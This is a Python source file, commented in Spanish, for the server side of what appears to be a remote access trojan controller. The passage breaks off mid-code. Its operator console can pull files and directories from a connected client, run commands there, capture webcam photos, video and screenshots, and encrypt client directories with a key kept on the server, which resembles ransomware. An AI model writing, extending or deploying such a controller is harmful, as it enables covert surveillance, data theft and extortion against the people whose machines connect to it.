## Server
import socket
import json
import os
import re
import pickle
import struct
import cv2
import numpy
import platform
import getpass
from time import sleep
from colorama import init
from colorama.ansi import Fore
from cryptography.fernet import Fernet
from udp import UDP
from man import logo, man

init(autoreset=True)

# Clase server-TCP
class TCP:
    # Se inicializa el host, el port y el chunk del programa
    def __init__(self, host, port):
        self.__myOs = platform.system().lower()
        if self.__myOs == 'linux':
            self.__src = f'/home/{getpass.getuser()}/.tcpIpy/server'
        if self.__myOs == 'windows':
            self.__src = f'C:\\Users\\{getpass.getuser()}\\.tcpIpy\\server'

        # Se cargan las variables de entorno
        if self.__myOs == 'linux':
            archivo = open(f'{self.__src}/var.json', 'r')
        if self.__myOs == 'windows':
            archivo = open(f'{self.__src}\\var.json', 'r')
        lista = json.load(archivo)
        archivo.close()
        self.__var = lista[0]
        self.__dirs = lista[1]
        self.loadDirs()

        # Se cargan los alias del archivo JSON
        if self.__myOs == 'linux':
            archivo = open(f'{self.__src}/alias.json', 'r')
        if self.__myOs == 'windows':
            archivo = open(f'{self.__src}\\alias.json', 'r')
        lista = json.load(archivo)
        archivo.close()
        self.__alias = lista[0]

        # host --> 0.0.0.0
        self.__host = host
        # port --> 1024-65535
        self.__port = port
        self.__newPort = self.__var['newPort']
        # chunk -->  4MB para enviar informacion
        self.__chunk = self.__var['chunk']

        # Se crea un socket
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Se configura el socket
        self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Se enlazan el host y el port
        self.__sock.bind((self.__host, self.__port))
        # El servidor se pone en escucha
        self.__sock.listen(1)
        print(Fore.CYAN + f"[*] Esperando conexion en el puerto {self.__port}")

        # Se recibe la conexion y la direccion
        self.__conexion, self.__addr = self.__sock.accept()
        print(Fore.GREEN + f"[+] Conexion establecida con {self.__addr[0]}")

        # Se crea un directorio inicial
        self.initDir = os.getcwd()
        # Se inicializa la variable para las imagenes
        self.pics = 0
        # Se recibe la informacion inicial
        info = self.__conexion.recv(1024).decode()
        info = info.split('\n')
        self.__userName = info[0]
        self.__hostName = info[1]
        self.__currentDir = info[2]

    # Imprime la terminal
    def terminal(self):
        print()
        print(Fore.GREEN + "\u250c\u2500\u2500(" + Fore.BLUE + f"{self.__userName}~{self.__hostName}" + Fore.GREEN + ")-[" + Fore.WHITE + self.__currentDir + Fore.GREEN + ']')
        print(Fore.GREEN + "\u2514\u2500" + Fore.BLUE + "> ", end='')

    def printMsg(self, msg):
        if msg[0:3] == '[+]':
            print(Fore.GREEN + f"{self.__userName}@{self.__addr[0]}: {msg}")
        elif msg[0:3] == '[!]':
            print(Fore.YELLOW + f"{self.__userName}@{self.__addr[0]}: {msg}")
        elif msg[0:3] == '[-]':
            print(Fore.RED + f"{self.__userName}@{self.__addr[0]}: {msg}")
        else:
            print(Fore.WHITE + f"{self.__userName}@{self.__addr[0]}: {msg}")

    def parametros(self, cmd, arg1, arg2=None):
        flags = None
        if arg2 is not None and re.search(arg2, cmd):
            m = re.search(arg2, cmd)
            if m.end() == len(cmd):
                flags = cmd[m.start()+1:m.end()]
                cmd = re.sub(arg2[:-3], '', cmd)
            else:
                flags = cmd[m.start()+1:m.end()-1]
                cmd = re.sub(arg2, ' ', cmd)

        m = re.split(arg1, cmd)
        m.pop(0)

        params = {}

        i = 0
        while i < len(m):
            flag = m[i].replace(' ', '')
            flag = flag.replace('=', '')
            params[flag] = m[i+1]
            i += 2

        return params, flags

    # Funcion para regresar el nombre de un archivo o directorio
    # ubicacion --> ubicacion del archivo o directorio
    def getNombre(self, ubicacion):
        nombre = os.path.abspath(ubicacion)
        nombre = os.path.basename(nombre)
        return nombre

    def newSock(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(3)
        return sock

    def loadDirs(self):
        for k, v in self.__dirs.items():
            if not os.path.isdir(v) and v != '':
                try:
                    os.mkdir(v)
                    print(Fore.GREEN + f"[+] Directorio \'{v}\' creado")
                except:
                    print(Fore.RED + f"[-] Error al crear el directorio \'{v}\'")

    # Funcion para generar una clave de encriptacion
    # clave --> nombre del archivo en que se almacena la clave
    def generarClave(self, clave):
        key = Fernet.generate_key()

        with open(clave, 'wb') as keyFile:
            keyFile.write(key)
        keyFile.close()
        print(Fore.GREEN + f"[+] Clave \"{clave}\" generada")

    # Funcion para regresar una clave de encriptacion
    # clave --> ubicacio del archivo en donde se almacena la clave
    def cargarClave(self, clave):
        return open(clave, 'rb').read()

    # Funcion para obtener la escala de una imagen (adaptar la imagen)
    # height --> alto de la imagen
    # width --> ancho de la imagen
    def escalar(self, height, width):
        if height > width:
            escala = 600/height
        elif width > height:
            escala = 600/width
        else:
            escala = (height+width)/2
            escala = 600/escala

        # Se regresa la escala que se usara para la imagen
        return escala

    def newImage(self, imagen, flags):
        if re.search("90", flags):
            imagen = cv2.rotate(imagen, cv2.ROTATE_90_COUNTERCLOCKWISE)
        if re.search("180", flags):
            imagen = cv2.rotate(imagen, cv2.ROTATE_180)
        if re.search("270", flags):
            imagen = cv2.rotate(imagen, cv2.ROTATE_90_CLOCKWISE)
        if re.search("x", flags):
            imagen = cv2.flip(imagen, 0)
        if re.search("y", flags):
            imagen = cv2.flip(imagen, 1)
        if re.search("g", flags):
            imagen = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
            imagen = cv2.cvtColor(imagen, cv2.COLOR_GRAY2BGR)
        if re.search("n", flags):
            imagen = 255 - imagen
        if re.search("m", flags):
            flip = cv2.flip(imagen, 1)
            imagen = numpy.hstack((imagen, flip))
        if re.search("c", flags):
            grises = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
            blur = cv2.GaussianBlur(grises, (3,3), 0)
            t1 = int(input("Threshold1: "))
            t2 = int(input("Threshold2: "))
            canny = cv2.Canny(image=blur, threshold1=t1, threshold2=t2)
            imagen = cv2.cvtColor(canny, cv2.COLOR_GRAY2BGR)

        return imagen


    # Funcion para enviar datos
    # info --> informacion a enviar
    def enviarDatos(self, info, conn=None):
        if conn == None:
            conexion = self.__conexion
        else:
            conexion = conn

        info = pickle.dumps(info)
        info = struct.pack('Q', len(info))+info
        conexion.sendall(info)

    # Funcion para recibir datos
    def recibirDatos(self, conn=None):
        if conn == None:
            conexion = self.__conexion
        else:
            conexion = conn

        data = b''
        size = struct.calcsize('Q')
        while len(data) < size:
            info = conexion.recv(self.__chunk)
            if not info:
                raise RuntimeError("Sin informacion")
            data += info

        dataSize = data[:size]
        data = data[size:]
        byteSize = struct.unpack('Q', dataSize)[0]

        while len(data) < byteSize:
            data += conexion.recv(self.__chunk)

        info = data[:byteSize]
        data = data[byteSize:]
        info = pickle.loads(info)

        # Se regresa la informacion tratada para ser usada
        return info

    # Funcion para enviar un archivo
    # ubicacion --> ubicacion del archivo que se quiere enviar
    def enviarArchivo(self, ubicacion, conn=None):
        if conn == None:
            sock = self.newSock()
            sock.bind((self.__host, self.__newPort))
            sock.listen(1)
            conexion = sock.accept()[0]
        else:
            conexion = conn

        peso = os.path.getsize(ubicacion)
        conexion.send(f"{peso}".encode())

        if peso > 0:
            paquetes = int(peso/self.__chunk)
            if paquetes == 0:
                paquetes = 1
            print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")

            keyInt = False
            conexion.recv(8)
            i = 1
            with open(ubicacion, 'rb') as archivo:
                info = archivo.read(self.__chunk)
                while info:
                    try:
                        self.enviarDatos(info, conexion)
                        info = archivo.read(self.__chunk)

                        print(f"Paquete {i} enviado", end='\r')
                        i += 1

                        msg = conexion.recv(8)
                        if msg == "end":
                            break

                    except:
                        keyInt = True
                        break

            archivo.close()
            if conn == None:
                conexion.close()
                sock.close()
            if keyInt:
                print(end='\r')
                return

            print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" enviado")

        else:
            print(Fore.YELLOW + f"[!] sft: Archivo \"{ubicacion}\" vacio -- Peso: {peso}")

    # Funcion para recibir un archivo
    # ubicacion --> ubicacion en donde se guardara el archivo recibido
    def recibirArchivo(self, ubicacion, conn=None):
        if conn == None:
            sock = self.newSock()
            sock.bind((self.__host, self.__newPort))
            sock.listen(1)
            conexion = sock.accept()[0]
        else:
            conexion = conn

        info = conexion.recv(1024).decode().split('-')
        peso = int(info[0])
        paquetes = int(info[1])

        if peso > 0:
            if paquetes == 0:
                paquetes = 1
            print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")

            keyInt = False
            i = 1
            with open(ubicacion, 'wb') as archivo:
                conexion.send(b'ok')
                while True:
                    try:
                        info = self.recibirDatos(conexion)
                        archivo.write(info)

                        if len(info) < self.__chunk:
                            conexion.send("end".encode())
                            break
                        else:
                            conexion.send("ok".encode())
                            print(f"Paquete {i} recibido", end='\r')
                            i += 1

                    except:
                        keyInt = True
                        break

            archivo.close()
            if conn == None:
                conexion.close()
                sock.close()
            if keyInt:
                print(end='\r')
                return

            print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" creado")

        else:
            print(Fore.YELLOW + f"[!] sff: Archivo \"{ubicacion}\" vacio -- Peso: {peso}")

    # Funcion para enviar archivos de un directorio
    # cmd --> comando ejecutado
    # origen --> ubicacion del directorio que se quiere enviar
    # index --> indice desde el que se quiere iniciar
    def enviarDirectorio(self, origen, x, auto=None):
        sock = self.newSock()
        sock.bind((self.__host, self.__newPort))
        sock.listen(1)
        conexion = sock.accept()[0]

        # Se calcula el numero de archivos
        archivos = []
        for i in os.listdir(origen):
            archivo = f"{origen}/{i}"
            if os.path.isfile(archivo):
                if x == '*':
                    archivos.append(archivo)
                if x != '*' and archivo.endswith(x):
                    archivos.append(archivo)
        tam = len(archivos)
        print(Fore.CYAN + f"[*] Numero de archivos: {tam}")

        conexion.send(str(tam).encode())
        conexion.recv(8)

        # Se comienzan a enviar los archivos
        index = 1
        subidos = 0
        while index <= tam:
            try:
                nombre = self.getNombre(archivos[index-1])
                peso = os.path.getsize(archivos[index-1])
                paquetes = int(peso/self.__chunk)

                if peso > 0:
                    if auto:
                        print(Fore.MAGENTA + f"{index}/{tam}. ", end='')
                        res = 'S'
                    else:
                        print(Fore.MAGENTA + f"\n[?] {index}/{tam}. Subir \"{nombre}\" ({paquetes})?...\n[S/n] ", end='')
                        res = input()
                else:
                    print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido ({nombre}, {paquetes})")
                    res = 'N'

                if len(res) == 0 or res.upper() == 'S':
                    conexion.send('S'.encode())

                    conexion.recv(8)
                    conexion.send(nombre.encode())

                    conexion.recv(8)
                    self.enviarArchivo(archivos[index-1], conexion)
                    conexion.send(b'ok')

                    subidos += 1

                elif res.lower() == 'q' or res.lower() == "quit":
                    conexion.send("quit".encode())
                    break

                else:
                    conexion.send('N'.encode())

                index += 1
                conexion.recv(8)

            except KeyboardInterrupt:
                break

        conexion.close()
        sock.close()

        print(Fore.GREEN + f"[+] {subidos} archivos subidos de {tam}")

    # Funcion para recibir un directori
    # cmd --> comando ejecutado
    # destino --> Directorio en el que se guardaran los archivos
    # index --> indice desde el que se quiere iniciar
    def recibirDirectorio(self, destino, auto=None):
        sock = self.newSock()
        sock.bind((self.__host, self.__newPort))
        sock.listen(1)
        conexion = sock.accept()[0]

        # Se recibe el numero de archivos
        conexion.recv(8)
        if not os.path.isdir(destino):
            os.mkdir(destino)

        conexion.send(b'ok')
        tam = int(conexion.recv(64).decode())
        print(Fore.CYAN + f"[*] Numero de archivos: {tam}")

        # Se comienzan a recibir los archivos
        index = 1
        bajados = 0
        while index <= tam:
            try:
                conexion.send(b'ok')
                info = conexion.recv(1024).decode()
                info = info.split('\n')
                nombre, paquetes, peso = info[:3]
                peso = int(peso)

                if peso > 0:
                    if auto:
                        print(Fore.MAGENTA + f"{index}/{tam}. ", end='')
                        res = 'S'
                    else:
                        print(Fore.MAGENTA + f"\n[?] {index}/{tam}. Bajar \"{nombre}\" (-p{paquetes}, -s{peso})?...\n[S/n] ", end='')
                        res = input()
                else:
                    print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido (-p{paquetes}, -s{peso})")
                    res = 'N'

                if len(res) == 0 or res.upper() == 'S':
                    conexion.send('S'.encode())
                    self.recibirArchivo(f"{destino}/{nombre}", conexion)
                    conexion.recv(8)
                    bajados += 1

                elif res.lower() == 'q' or res.lower() == "quit":
                    conexion.send("quit".encode())
                    break

                else:
                    conexion.send(b'N')

                index += 1

            except KeyboardInterrupt:
                break

        conexion.close()
        sock.close()

        print(Fore.GREEN + f"[+] {bajados} archivos descargados de {tam}")

    # Funcion para ejecutar comandos en la maquina local
    # cmd --> comando que se quiere ejecutar
    def local(self, cmd):
        if cmd.lower()[:2] == "cd":
            directorio = cmd[3:]
            if os.path.isdir(directorio):
                os.chdir(directorio)
                print(os.getcwd())

            else:
                print(Fore.YELLOW + f"[!] Directorio \"{directorio}\" no encontrado")

        else:
            os.system(cmd)

    # Funcion para terminar la conexion entre maquinas
    # cmd --> comando ingresado
    def exit(self, cmd):
        print(Fore.MAGENTA + f"[?] Segur@ que quieres terminar la conexion con {self.__addr}?...\n[S/n] ", end='')
        res = input()

        if len(res) == 0 or res.upper() == 'S':
            self.__conexion.send(cmd.encode())
            self.__conexion.close()
            self.__sock.close()
            print(Fore.YELLOW + f"[!] Conexion terminada con {self.__userName}@{self.__addr[0]}")
            return True
        else:
            print(Fore.YELLOW + "[!] Operacion cancelada")
            return False

    # Funcion para cambiar de directorio en el cliente
    # cmd --> comando ingresado
    def cd(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1042).decode()

        if msg[:3] == "[-]":
            self.printMsg(msg)
            return

        if len(msg) > 40:
            msg = f"... {msg[-40:]}"
        self.__currentDir = msg

    # Funcion para recibir un archivo del cliente
    # cmd --> comando ingresado
    def sendFileFrom(self, cmd):
        params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]

        self.__conexion.send(cmd.encode())
        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            if '-o' in params.keys():
                destino = params['-o']
            else:
                self.__conexion.send(b'ok')
                destino = self.__conexion.recv(1024).decode()
                if self.__dirs['downloads'] != '' and os.path.isdir(self.__dirs['downloads']):
                    destino = self.__dirs['downloads'] + '/' + destino

            self.__conexion.send(b'ok')
            self.recibirArchivo(destino)

        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para enviar un archivo al cliente
    # cmd --> comando ingresado
    def sendFileTo(self, cmd):
        params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
        origen = params['-i']

        if not os.path.isfile(origen):
            print(Fore.YELLOW + f"[!] Archivo \"{origen}\" no encontrado")
            return

        self.__conexion.send(cmd.encode())

        if '-o' in params.keys():
            pass
        else:
            self.__conexion.recv(8)
            nombre = self.getNombre(origen)
            self.__conexion.send(nombre.encode())

        self.__conexion.recv(8)
        self.enviarArchivo(origen)
        msg = self.__conexion.recv(1024).decode()
        print(Fore.CYAN + msg)

    # Funcion para recibir y visualizar una imagen
    # cmd --> comando ingresado
    def image(self, cmd):
        params, flags = self.parametros(cmd, r"(\s-[i]+[= ])", r"\s-[xygnmc012789]+\s?")
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        self.printMsg(msg)

        if msg[0:3] == '[!]':
            return

        self.__conexion.send("ok".encode())
        nombre = self.__conexion.recv(1024).decode()
        nombre = re.sub(r"[^a-zA-Z0-9. ]", '', nombre)

        self.__conexion.send("ok".encode())
        info = self.recibirDatos()

        matriz = numpy.frombuffer(info, dtype=numpy.uint8)
        original = cv2.imdecode(matriz, -1)

        height, width = original.shape[:2]
        escala = self.escalar(height, width)
        imagen = cv2.resize(original, None, fx=escala, fy=escala)
        print(Fore.CYAN + "[*] Escala:", escala)

        if flags:
            imagen = self.newImage(imagen, flags)

        print(Fore.CYAN + f"[*] {self.__userName}@{self.__addr[0]}:", nombre)
        userName = re.sub(r"[^a-zA-Z0-9. ]", '', self.__userName)
        cv2.imshow(f"{userName}@{self.__addr[0]}: {nombre}", imagen)

        while True:
            key = cv2.waitKey()
            if key == 27:
                break
            if key == ord('s'):
                if self.__dirs['imgs'] != '' and os.path.isdir(self.__dirs['imgs']):
                    cv2.imwrite(f"{self.__dirs['imgs']}/{nombre}", original)
                else:
                    cv2.imwrite(f"{nombre}", original)
                print(Fore.GREEN + f"[+] Foto \"{nombre}\" guardada")
                break
        cv2.destroyAllWindows()

    # Funcion para recibir una foto de la camara y visualizarla
    # cmd --> comando ingresado
    def pic(self, cmd):
        flags = self.parametros(cmd, r"(\s-c[= ])")[1]
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        self.printMsg(msg)

        if msg[0:3] == '[!]':
            return

        self.__conexion.send("ok".encode())
        info = self.recibirDatos()

        matriz = numpy.frombuffer(info, dtype=numpy.uint8)
        original = cv2.imdecode(matriz, -1)

        height, width = original.shape[:2]
        escala = self.escalar(height, width)
        imagen = cv2.resize(original, None, fx=escala, fy=escala)

        print(Fore.CYAN + "[*] Escala:", escala)
        userName = re.sub(r"[^a-zA-Z0-9. ]", '', self.__userName)
        cv2.imshow(f"{userName}@{self.__addr[0]}: Foto", imagen)

        while True:
            key = cv2.waitKey()
            if key == 27:
                break
            if key == ord('s'):
                if self.__dirs['pics'] != '' and os.path.isdir(self.__dirs['pics']):
                    fotoRuta = f"{self.__dirs['pics']}/pic{self.pics}.jpg"
                else:
                    fotoRuta = f"pic{self.pics}.jpg"
                cv2.imwrite(fotoRuta, original)
                print(Fore.GREEN + f"[+] Foto \"{fotoRuta}\" guardada")
                self.pics += 1
                break
        cv2.destroyAllWindows()

    # Funcion para recibir video del cliente
    # cmd --> comando ingresado
    def captura(self, cmd):
        udp = UDP(self.__host, self.__newPort)
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        self.printMsg(msg)
        if msg[0:3] == '[!]':
            udp.close()
            return

        try:
            udp.conectar()
            self.__conexion.send(b'ok')
            udp.captura(self.__userName)
            sleep(0.1)
            udp.close()
            msg = self.__conexion.recv(1024).decode()
            self.printMsg(msg)
        except:
            udp.close()
            msg = self.__conexion.recv(1024).decode()
            self.printMsg(msg)

    # Funcion para recibir un directorio del cliente
    # cmd --> comando ingresado
    def sendDirFrom(self, cmd):
        params, flags = self.parametros(cmd, r"(\s-[iox]+[= ])", r"\s-a\s?")

        self.__conexion.send(cmd.encode())
        msg = self.__conexion.recv(1024).decode()
        self.printMsg(msg)
        if msg[0:3] == '[!]':
            return

        if '-o' in params.keys():
            destino = params['-o']
        else:
            self.__conexion.send(b'ok')
            destino = self.__conexion.recv(1024).decode()
            if self.__dirs['downloads'] != '' and os.path.isdir(self.__dirs['downloads']):
                destino = self.__dirs['downloads'] + '/' + destino

        self.__conexion.send(b'ok')
        if flags:
            self.recibirDirectorio(destino, 1)
        else:
            self.recibirDirectorio(destino)

    # Funcion para enviar un directorio al cliente
    # cmd --> comando ingresado
    def sendDirTo(self, cmd):
        params, flags = self.parametros(cmd, r"(\s-[iox]+[= ])", r"\s-a\s?")
        origen = params['-i']
        x = params['-x'] if '-x' in params.keys() else '*'

        if os.path.isdir(origen):
            self.__conexion.send(cmd.encode())

            if '-o' in params.keys():
                pass
            else:
                self.__conexion.recv(8)
                destino = self.getNombre(origen)
                self.__conexion.send(destino.encode())

            self.__conexion.recv(8)
            if flags:
                self.enviarDirectorio(origen, x, 1)
            else:
                self.enviarDirectorio(origen, x)
        else:
            print(Fore.YELLOW + f"Directorio \"{origen}\" no encontrado")

    # Funcion para comprimir un directorio del cliente
    # cmd --> comando ingresado
    def comprimir(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para descomprimir un archivo '.zip' del cliente
    # cmd --> comando ingresado
    def descomprimir(self, cmd):
        self.__conexion.send(cmd.encode())
        
        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para encriptar un directorio del cliente
    # cmd --> comando ingresado
    def encrypt(self, cmd):
        params = self.parametros(cmd, r"(\s-[ik]+[= ])")[0]
        clave = params['-k']
        directorio = params['-i']

        if not clave.endswith(".key"):
            print(Fore.YELLOW + f"[!] Error al crear la clave \"{clave}\"")
            return

        self.generarClave(f"{clave}")
        key = self.cargarClave(f"{clave}")

        self.__conexion.send(cmd.encode())
        self.__conexion.recv(8)
        self.__conexion.send(key)

        msg = self.__conexion.recv(1024).decode()
        self.printMsg(msg)
        if msg[0:3] == '[!]':
            os.remove(clave)
            return

        nombre = msg.split('\n')[1]
        print(Fore.MAGENTA + f"[?] Segur@ que quieres encriptar el directorio \"{nombre}\"?...\n[S/n] ", end='')
        res = input()

        if len(res) == 0 or res.upper() == 'S':
            self.__conexion.send('S'.encode())

            msg = self.__conexion.recv(1024).decode()
            self.printMsg(msg)
            if msg[0:3] == '[-]':
                os.remove(clave)
                return

            self.__conexion.send(b'ok')
            self.recibirArchivo(f"{os.getcwd()}/{clave}.dat")

        else:
            self.__conexion.send('N'.encode())
            msg = self.__conexion.recv(1024).decode()
            self.printMsg(msg)
            os.remove(clave)

    # Funcion para desencriptar un directorio del cliente
    # cmd --> comando ingresado
    def decrypt(self, cmd):
        params = self.parametros(cmd, r"(\s-[ik]+[= ])")[0]
        clave = params['-k']

        if not os.path.isfile(clave) or not clave.endswith(".key"):
            print(Fore.YELLOW + f"[!] Clave \"{clave}\" no encontrada")
            return

        print(Fore.MAGENTA + f"[?] Segur@ que quieres usar la clave \"{clave}\"?...\n[S/n] ", end='')
        res = input()
        if len(res) > 0 and res.upper() != 'S':
            print(Fore.YELLOW + f"[!] Desencriptacion cancelada")
            return

        key = self.cargarClave(clave)
        self.__conexion.send(cmd.encode())
        self.__conexion.recv(8)
        self.__conexion.send(key)

        msg = self.__conexion.recv(1024).decode()
        self.printMsg(msg)
        if msg[0:3] == '[!]':
            return

        nombre = msg.split('\n')[1]
        print(Fore.MAGENTA + f"[?] Segur@ que quieres desencriptar el directorio \"{nombre}\"?...\n[S/n] ", end='')
        res = input()

        if len(res) == 0 or res.upper() == 'S':
            self.__conexion.send('S'.encode())

            msg = self.__conexion.recv(1024).decode()
            self.printMsg(msg)
            if msg[0:3] == '[-]':
                return

            self.__conexion.send(b'ok')
            self.recibirArchivo(f"{os.getcwd()}/{self.getNombre(clave)}.dat")
            os.remove(f"{clave}")
            print(Fore.YELLOW + f"[!] Clave \"{clave}\" eliminada")

        else:
            self.__conexion.send('N'.encode())
            msg = self.__conexion.recv(1024).decode()
            self.printMsg(msg)

    # Funcion para descargar archivos web en la maquina del cliente
    # cmd --> comando ingresado
    def wget(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para obtener la cantidad de elementos de un directorio
    # cmd --> comando ingresado
    def lenDir(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            self.__conexion.send("ok".encode())
            info = self.__conexion.recv(1024).decode()
            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {info}")
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para guardar en un archivo de texto la salida de un comando
    # cmd --> comando ingresado
    def save(self, cmd):
        self.__conexion.send(cmd.encode())
        ok = self.__conexion.recv(8)
        with open(f"{self.initDir}/info.txt", 'w') as archivo:
            self.__conexion.send("ok".encode())
            while True:
                info = self.recibirDatos().decode()
                archivo.write(info)

                if len(info) < self.__chunk:
                    break
        archivo.close()
        print(Fore.GREEN + "[+] Informacion guardada")

    def screenShot(self, cmd):
        params = self.parametros(cmd, r"(\s-[dnot]+[= ])")[0]
        directorio = params['-o'] if '-o' in params.keys() else '.'
        if not os.path.isdir(directorio):
            os.mkdir(directorio)

        n = int(params['-n']) if '-n' in params.keys() else 1
        t = float(params['-t']) if '-t' in params.keys() else 0.0

        if t < 0.1 and n > 1:
            print(Fore.YELLOW + f"[!] El parametro '-t' debe ser mayor o igual a 0.1\nt es {t}")
            return

        self.__conexion.send(cmd.encode())

        i = 0
        while i < n:
            if self.__dirs['screenshots'] != '' and os.path.isdir(self.__dirs['screenshots']):
                ubicacion = self.__dirs['screenshots'] + '/' + f'ss{i}.png'
            else:
                ubicacion = f"{directorio}/ss{i}.png"
            self.__conexion.recv(8)
            self.recibirArchivo(ubicacion)
            i += 1

    # Funcion para ingresar y evaluar comandos
    def shell(self):
        while True:
            try:
                self.terminal()
                cmd = input()
                try:
                    x = re.match(r"^!?\w+", cmd)[0] # Se obtiene el comando ingresado con re

                    # Se revisa si el comando esta en los alias
                    if x in self.__alias.keys():
                        cmd = re.sub(f"^{x}\s?", self.__alias[x], cmd) # Se sustituye el alias en el comando
                        x = re.match(r"^!?\w+", cmd)[0] # Se obtiene el comando de nuevo

                except:
                    pass

                if cmd == '' or cmd.replace(' ', '') == '':
                    print()
                    continue

                # help
                elif x.lower() == "help":
                    logo()
                    man()

                elif x.lower() == "mialias":
                    for k, v in self.__alias.items():
                        print(f"{k}=\'{v}\'")

                elif x.lower() == "mienv":
                    for k, v in self.__var.items():
                        print(f"{k}=\'{v}\'")
                    for k, v in self.__dirs.items():
                        print(f"{k}=\'{v}\'")

                # !
                elif x[0] == '!':
                    try:
                        self.local(cmd[1:])

                    except Exception as e:
                        print(Fore.RED + "[-] Error de sintaxis local")
                        print(e)

                # clear
                elif x.lower() == "clear" or x.lower() == "cls" or x.lower() == "clc":
                    if self.__myOs == "linux" or self.__myOs == "darwin":
                        os.system("clear")
                    if self.__myOs == "windows":
                        os.system("cls")

                # exit
                elif x.lower() == "exit":
                    try:
                        # Se manda a llamar a la funcion 'self.exit'
                        # y se termina la conexion
                        salir = self.exit(cmd)
                        if salir:
                            break

                    except Exception as e:
                        print(Fore.RED + "[-] Error al terminar la conexion")
                        print(e)

                # quit
                elif x.lower() == 'q' or x.lower() == "quit":
                    try:
                        # Se cierra todo pero el cliente se
                        # mantiene conectado
                        self.__conexion.send(cmd.encode())
                        break

                    except Exception as e:
                        print(Fore.RED + "[-] Error al cerrar el programa")
                        print(e)

                # cd
                elif x.lower() == "cd":
                    try:
                        # Se manda a llamar a la funcion 'self.cd'
                        self.cd(cmd)

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (cd)")
                        print(e)

                # sff
                elif x.lower() == "sff":
                    try:
                        if re.search(r"\s-i[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.sendFileFrom'
                            self.sendFileFrom(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro de entrada (-i)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (sff)")
                        print(e)

                # sft
                elif x.lower() == "sft":
                    try:
                        if re.search(r"\s-i[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.sendFileTo'
                            self.sendFileTo(cmd)
                        else:
                            print(Fore.RED + "[!] Falta del parametro de entrada (-i)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (sft)")
                        print(e)

                # img
                elif x.lower() == "img":
                    try:
                        if re.search(r"\s-i[= ]", cmd) or re.search(r"\s-r\s?", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.image'
                            self.image(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro imagen (-i)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (img)")
                        print(e)

                # pic
                elif x.lower() == "pic":
                    try:
                        if re.search(r"\s-c[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.pic'
                            self.pic(cmd)
                        
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro camara (-c)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (pic)")
                        print(e)

                # cap
                elif x.lower() == "cap":
                    try:
                        if re.search(r"\s-c[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.cap'
                            self.captura(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro camara (-c)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (cap)")
                        print(e)

                # sdf
                elif x.lower() == "sdf":
                    try:
                        if re.search(r"\s-i[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.sendDirFrom'
                            self.sendDirFrom(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro origen (-o)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (sdf)")
                        print(e)

                # sdt
                elif x.lower() == "sdt":
                    try:
                        if re.search(r"\s-i[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.sendDirTo'
                            self.sendDirTo(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro origen (-o)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (sdt)")
                        print(e)

                # zip
                elif x.lower() == "zip":
                    try:
                        if re.search(r"\s-i[= ]", cmd):
